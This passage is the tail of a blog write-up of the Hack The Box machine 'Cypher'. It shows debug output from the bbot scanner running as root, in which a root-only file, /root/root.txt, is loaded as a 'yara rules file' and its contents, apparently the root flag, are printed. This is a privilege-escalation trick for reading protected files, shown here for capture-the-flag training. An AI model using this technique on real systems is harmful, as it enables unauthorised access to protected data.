bbot_cli_main: Adding module <span class="string">&quot;json&quot;</span> of <span class="built_in">type</span> <span class="string">&quot;output&quot;</span></span><br><span class="line">[DBUG] Preset bbot_cli_main: Adding module <span class="string">&quot;python&quot;</span> of <span class="built_in">type</span> <span class="string">&quot;output&quot;</span></span><br><span class="line">[DBUG] Preset bbot_cli_main: Adding module <span class="string">&quot;txt&quot;</span> of <span class="built_in">type</span> <span class="string">&quot;output&quot;</span></span><br><span class="line">[DBUG] Preset bbot_cli_main: Adding module <span class="string">&quot;aggregate&quot;</span> of <span class="built_in">type</span> <span class="string">&quot;internal&quot;</span></span><br><span class="line">[DBUG] Preset bbot_cli_main: Adding module <span class="string">&quot;dnsresolve&quot;</span> of <span class="built_in">type</span> <span class="string">&quot;internal&quot;</span></span><br><span class="line">[DBUG] Preset bbot_cli_main: Adding module <span class="string">&quot;cloudcheck&quot;</span> of <span class="built_in">type</span> <span class="string">&quot;internal&quot;</span></span><br><span class="line">[DBUG] Preset bbot_cli_main: Adding module <span class="string">&quot;excavate&quot;</span> of <span class="built_in">type</span> <span class="string">&quot;internal&quot;</span></span><br><span class="line">[DBUG] Preset bbot_cli_main: Adding module <span class="string">&quot;speculate&quot;</span> of <span class="built_in">type</span> <span class="string">&quot;internal&quot;</span></span><br><span class="line">[VERB]</span><br><span class="line">[VERB] <span class="comment">### MODULES ENABLED ###</span></span><br><span class="line">[VERB]</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] | Module     | Type     | Needs API Key   | Description                   | Flags         | Consumed Events      | Produced Events    |</span><br><span class="line">[VERB] +============+==========+=================+===============================+===============+======================+====================+</span><br><span class="line">[VERB] | csv        | output   | No              | Output to CSV                 |               | *                    |                    |</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] | json       | output   | No              | Output to Newline-Delimited   |               | *                    |                    |</span><br><span class="line">[VERB] |            |          |                 | JSON (NDJSON)                 |               |                      |                    |</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] | python     | output   | No              | Output via Python API         |               | *                    |                    |</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] | stdout     | output   | No              | Output to text                |               | *                    |                    |</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] | txt        | output   | No              | Output to text                |               | *                    |                    |</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] | cloudcheck | internal | No              | Tag events by cloud provider, |               | *                    |                    |</span><br><span class="line">[VERB] |            |          |                 | identify cloud resources like |               |                      |                    |</span><br><span class="line">[VERB] |            |          |                 | storage buckets               |               |                      |                    |</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] | dnsresolve | internal | No              |                               |               | *                    |                    |</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] | aggregate  | internal | No              | Summarize statistics at the   | passive, safe |                      |                    |</span><br><span class="line">[VERB] |            |          |                 | end of a scan                 |               |                      |                    |</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] | excavate   | internal | No              | Passively extract juicy       | passive       | HTTP_RESPONSE,       | URL_UNVERIFIED,    |</span><br><span class="line">[VERB] |            |          |                 | tidbits from scan data        |               | RAW_TEXT             | WEB_PARAMETER      |</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] | speculate  | internal | No              | Derive certain event types    | passive       | AZURE_TENANT,        | DNS_NAME, FINDING, |</span><br><span class="line">[VERB] |            |          |                 | from others by common sense   |               | DNS_NAME,            | IP_ADDRESS,        |</span><br><span class="line">[VERB] |            |          |                 |                               |               | DNS_NAME_UNRESOLVED, | OPEN_TCP_PORT,     |</span><br><span class="line">[VERB] |            |          |                 |                               |               | HTTP_RESPONSE,       | ORG_STUB           |</span><br><span class="line">[VERB] |            |          |                 |                               |               | IP_ADDRESS,          |                    |</span><br><span class="line">[VERB] |            |          |                 |                               |               | IP_RANGE, SOCIAL,    |                    |</span><br><span class="line">[VERB] |            |          |                 |                               |               | STORAGE_BUCKET, URL, |                    |</span><br><span class="line">[VERB] |            |          |                 |                               |               | URL_UNVERIFIED,      |                    |</span><br><span class="line">[VERB] |            |          |                 |                               |               | USERNAME             |                    |</span><br><span class="line">[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+</span><br><span class="line">[VERB] Loading word cloud from /root/.bbot/scans/liquid_bellatrix/wordcloud.tsv</span><br><span class="line">[DBUG] Failed to load word cloud from /root/.bbot/scans/liquid_bellatrix/wordcloud.tsv: [Errno 2] No such file or directory: <span class="string">&#x27;/root/.bbot/scans/liquid_bellatrix/wordcloud.tsv&#x27;</span></span><br><span class="line">[INFO] Scan with 0 modules seeded with 0 targets (0 <span class="keyword">in</span> whitelist)</span><br><span class="line">[WARN] No scan modules to load</span><br><span class="line">[DBUG] Installing cloudcheck - Preloaded Deps &#123;<span class="string">&#x27;modules&#x27;</span>: [], <span class="string">&#x27;pip&#x27;</span>: [], <span class="string">&#x27;pip_constraints&#x27;</span>: [], <span class="string">&#x27;shell&#x27;</span>: [], <span class="string">&#x27;apt&#x27;</span>: [], <span class="string">&#x27;ansible&#x27;</span>: [], <span class="string">&#x27;common&#x27;</span>: []&#125;</span><br><span class="line">[DBUG] No dependency work to <span class="keyword">do</span> <span class="keyword">for</span> module <span class="string">&quot;cloudcheck&quot;</span></span><br><span class="line">[DBUG] Installing stdout - Preloaded Deps &#123;<span class="string">&#x27;modules&#x27;</span>: [], <span class="string">&#x27;pip&#x27;</span>: [], <span class="string">&#x27;pip_constraints&#x27;</span>: [], <span class="string">&#x27;shell&#x27;</span>: [], <span class="string">&#x27;apt&#x27;</span>: [], <span class="string">&#x27;ansible&#x27;</span>: [], <span class="string">&#x27;common&#x27;</span>: []&#125;</span><br><span class="line">[DBUG] No dependency work to <span class="keyword">do</span> <span class="keyword">for</span> module <span class="string">&quot;stdout&quot;</span></span><br><span class="line">[DBUG] Installing dnsresolve - Preloaded Deps &#123;<span class="string">&#x27;modules&#x27;</span>: [], <span class="string">&#x27;pip&#x27;</span>: [], <span class="string">&#x27;pip_constraints&#x27;</span>: [], <span class="string">&#x27;shell&#x27;</span>: [], <span class="string">&#x27;apt&#x27;</span>: [], <span class="string">&#x27;ansible&#x27;</span>: [], <span class="string">&#x27;common&#x27;</span>: []&#125;</span><br><span class="line">[DBUG] No dependency work to <span class="keyword">do</span> <span class="keyword">for</span> module <span class="string">&quot;dnsresolve&quot;</span></span><br><span class="line">[DBUG] Installing csv - Preloaded Deps &#123;<span class="string">&#x27;modules&#x27;</span>: [], <span class="string">&#x27;pip&#x27;</span>: [], <span class="string">&#x27;pip_constraints&#x27;</span>: [], <span class="string">&#x27;shell&#x27;</span>: [], <span class="string">&#x27;apt&#x27;</span>: [], <span class="string">&#x27;ansible&#x27;</span>: [], <span class="string">&#x27;common&#x27;</span>: []&#125;</span><br><span class="line">[DBUG] No dependency work to <span class="keyword">do</span> <span class="keyword">for</span> module <span class="string">&quot;csv&quot;</span></span><br><span class="line">[DBUG] Installing excavate - Preloaded Deps &#123;<span class="string">&#x27;modules&#x27;</span>: [], <span class="string">&#x27;pip&#x27;</span>: [], <span class="string">&#x27;pip_constraints&#x27;</span>: [], <span class="string">&#x27;shell&#x27;</span>: [], <span class="string">&#x27;apt&#x27;</span>: [], <span class="string">&#x27;ansible&#x27;</span>: [], <span class="string">&#x27;common&#x27;</span>: []&#125;</span><br><span class="line">[DBUG] No dependency work to <span class="keyword">do</span> <span class="keyword">for</span> module <span class="string">&quot;excavate&quot;</span></span><br><span class="line">[DBUG] Installing json - Preloaded Deps &#123;<span class="string">&#x27;modules&#x27;</span>: [], <span class="string">&#x27;pip&#x27;</span>: [], <span class="string">&#x27;pip_constraints&#x27;</span>: [], <span class="string">&#x27;shell&#x27;</span>: [], <span class="string">&#x27;apt&#x27;</span>: [], <span class="string">&#x27;ansible&#x27;</span>: [], <span class="string">&#x27;common&#x27;</span>: []&#125;</span><br><span class="line">[DBUG] No dependency work to <span class="keyword">do</span> <span class="keyword">for</span> module <span class="string">&quot;json&quot;</span></span><br><span class="line">[DBUG] Installing aggregate - Preloaded Deps &#123;<span class="string">&#x27;modules&#x27;</span>: [], <span class="string">&#x27;pip&#x27;</span>: [], <span class="string">&#x27;pip_constraints&#x27;</span>: [], <span class="string">&#x27;shell&#x27;</span>: [], <span class="string">&#x27;apt&#x27;</span>: [], <span class="string">&#x27;ansible&#x27;</span>: [], <span class="string">&#x27;common&#x27;</span>: []&#125;</span><br><span class="line">[DBUG] No dependency work to <span class="keyword">do</span> <span class="keyword">for</span> module <span class="string">&quot;aggregate&quot;</span></span><br><span class="line">[DBUG] Installing speculate - Preloaded Deps &#123;<span class="string">&#x27;modules&#x27;</span>: [], <span class="string">&#x27;pip&#x27;</span>: [], <span class="string">&#x27;pip_constraints&#x27;</span>: [], <span class="string">&#x27;shell&#x27;</span>: [], <span class="string">&#x27;apt&#x27;</span>: [], <span class="string">&#x27;ansible&#x27;</span>: [], <span class="string">&#x27;common&#x27;</span>: []&#125;</span><br><span class="line">[DBUG] No dependency work to <span class="keyword">do</span> <span class="keyword">for</span> module <span class="string">&quot;speculate&quot;</span></span><br><span class="line">[DBUG] Installing python - Preloaded Deps &#123;<span class="string">&#x27;modules&#x27;</span>: [], <span class="string">&#x27;pip&#x27;</span>: [], <span class="string">&#x27;pip_constraints&#x27;</span>: [], <span class="string">&#x27;shell&#x27;</span>: [], <span class="string">&#x27;apt&#x27;</span>: [], <span class="string">&#x27;ansible&#x27;</span>: [], <span class="string">&#x27;common&#x27;</span>: []&#125;</span><br><span class="line">[DBUG] No dependency work to <span class="keyword">do</span> <span class="keyword">for</span> module <span class="string">&quot;python&quot;</span></span><br><span class="line">[DBUG] Installing txt - Preloaded Deps &#123;<span class="string">&#x27;modules&#x27;</span>: [], <span class="string">&#x27;pip&#x27;</span>: [], <span class="string">&#x27;pip_constraints&#x27;</span>: [], <span class="string">&#x27;shell&#x27;</span>: [], <span class="string">&#x27;apt&#x27;</span>: [], <span class="string">&#x27;ansible&#x27;</span>: [], <span class="string">&#x27;common&#x27;</span>: []&#125;</span><br><span class="line">[DBUG] No dependency work to <span class="keyword">do</span> <span class="keyword">for</span> module <span class="string">&quot;txt&quot;</span></span><br><span class="line">[VERB] Loading 0 scan modules:</span><br><span class="line">[VERB] Loading 5 internal modules: aggregate,cloudcheck,dnsresolve,excavate,speculate</span><br><span class="line">[VERB] Loaded module <span class="string">&quot;aggregate&quot;</span></span><br><span class="line">[VERB] Loaded module <span class="string">&quot;cloudcheck&quot;</span></span><br><span class="line">[VERB] Loaded module <span class="string">&quot;dnsresolve&quot;</span></span><br><span class="line">[VERB] Loaded module <span class="string">&quot;excavate&quot;</span></span><br><span class="line">[VERB] Loaded module <span class="string">&quot;speculate&quot;</span></span><br><span class="line">[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)</span><br><span class="line">[VERB] Loading 5 output modules: csv,json,python,stdout,txt</span><br><span class="line">[VERB] Loaded module <span class="string">&quot;csv&quot;</span></span><br><span class="line">[VERB] Loaded module <span class="string">&quot;json&quot;</span></span><br><span class="line">[VERB] Loaded module <span class="string">&quot;python&quot;</span></span><br><span class="line">[VERB] Loaded module <span class="string">&quot;stdout&quot;</span></span><br><span class="line">[VERB] Loaded module <span class="string">&quot;txt&quot;</span></span><br><span class="line">[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)</span><br><span class="line">[VERB] Setting up modules</span><br><span class="line">[DBUG] _scan_ingress: Setting up module _scan_ingress</span><br><span class="line">[DBUG] _scan_ingress: Finished setting up module _scan_ingress</span><br><span class="line">[DBUG] dnsresolve: Setting up module dnsresolve</span><br><span class="line">[DBUG] dnsresolve: Finished setting up module dnsresolve</span><br><span class="line">[DBUG] aggregate: Setting up module aggregate</span><br><span class="line">[DBUG] aggregate: Finished setting up module aggregate</span><br><span class="line">[DBUG] cloudcheck: Setting up module cloudcheck</span><br><span class="line">[DBUG] cloudcheck: Finished setting up module cloudcheck</span><br><span class="line">[DBUG] internal.excavate: Setting up module excavate</span><br><span class="line">[DBUG] internal.excavate: Including Submodule CSPExtractor</span><br><span class="line">[DBUG] internal.excavate: Including Submodule EmailExtractor</span><br><span class="line">[DBUG] internal.excavate: Including Submodule ErrorExtractor</span><br><span class="line">[DBUG] internal.excavate: Including Submodule FunctionalityExtractor</span><br><span class="line">[DBUG] internal.excavate: Including Submodule HostnameExtractor</span><br><span class="line">[DBUG] internal.excavate: Including Submodule JWTExtractor</span><br><span class="line">[DBUG] internal.excavate: Including Submodule NonHttpSchemeExtractor</span><br><span class="line">[DBUG] internal.excavate: Including Submodule ParameterExtractor</span><br><span class="line">[DBUG] internal.excavate: Parameter Extraction disabled because no modules consume WEB_PARAMETER events</span><br><span class="line">[DBUG] internal.excavate: Including Submodule SerializationExtractor</span><br><span class="line">[DBUG] internal.excavate: Including Submodule URLExtractor</span><br><span class="line">[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]</span><br><span class="line">[DBUG] internal.excavate: Final combined yara rule contents: 519ec2c48dbd114a85096a3fefbf8516</span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for Cypher; a short writeup. Hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Cypher</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-07-24 11:50:16</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-07-24 18:22:18
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/07/24/Hackthebox-Cypher/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/07/18/Hackthebox-Scepter/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Scepter</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Cypher</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application-http-cypher-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;cypher.htb&#x2F; </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-bbot-abuse"><span class="nav-text">Privilege Escalation - bbot abuse</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
